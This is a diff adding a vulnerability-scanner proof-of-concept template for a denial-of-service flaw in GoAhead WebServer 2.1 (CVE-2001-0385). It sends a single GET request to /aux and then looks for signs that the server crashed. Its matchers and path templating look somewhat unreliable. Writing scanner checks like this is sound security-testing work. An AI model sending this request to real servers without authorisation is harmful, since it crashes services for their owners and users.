@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "向 GoAhead WebServer 2.1 的 /aux 路径发送 HTTP GET 请求，触发拒绝服务。验证方式：发送恶意请求后再次请求正常页面，若连接被重置或超时则判定服务已崩溃。"
+id = "POC-AVE-2001-0157"
+name = "GoAhead WebServer 2.1 /aux Denial of Service PoC"
+severity = "medium"
+tags = ["ave-2001-0157"]
+vuln_id = [
+    "CVE-2001-0385",
+    "AVE-2001-0157",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/aux"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "reset",
+    "refused",
+    "timeout",
+]
